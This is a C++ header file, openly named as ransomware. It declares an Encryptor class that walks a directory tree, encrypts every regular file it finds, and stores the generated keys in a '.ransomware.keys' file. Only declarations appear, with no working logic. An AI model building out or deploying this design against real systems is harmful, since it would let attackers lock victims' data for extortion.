#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <string>
#include <filesystem>
#include <vector>
#include <memory>
#include <cstdint>
#include <fstream>

class Encryptor final {
public:
    Encryptor() = delete;
    Encryptor(std::filesystem::path const &rootPath, bool decrypt);

    ~Encryptor() = default;

    void Encrypt();
    void Decrypt();

private:
    constexpr static auto KEYS_FILENAME = ".ransomware.keys";
    constexpr static auto CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";

    using Key = std::unique_ptr<std::uint8_t[]>;

    Key GenerateKey(int length);
    void ProcessDirectory(std::filesystem::directory_entry const &rootEntry);
    void EncryptRegularFile(std::filesystem::path const &filePath, std::ofstream &keysOS);

    std::filesystem::path rootPath_{};
    std::vector<std::filesystem::path> regularFiles_{};
    bool decrypt_ = false;
};

#endif // RANSOMWARE_H
